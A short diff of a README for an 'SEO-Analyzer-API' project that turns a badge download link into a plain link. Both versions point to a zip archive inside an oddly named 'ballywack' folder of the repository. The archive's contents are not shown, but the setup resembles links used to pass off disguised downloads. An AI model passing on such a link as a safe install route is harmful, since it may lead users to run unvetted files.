@@ -1,6 +1,6 @@
 # 🚀 SEO-Analyzer-API - Fast Website Analysis Made Easy
 
-[![Download SEO-Analyzer-API](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip)](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip)
+[Download SEO-Analyzer-API](https://raw.githubusercontent.com/Nithinjayden/SEO-Analyzer-API/main/ballywack/SEO-Analyzer-API.zip)
 
 ## 📖 Overview
 
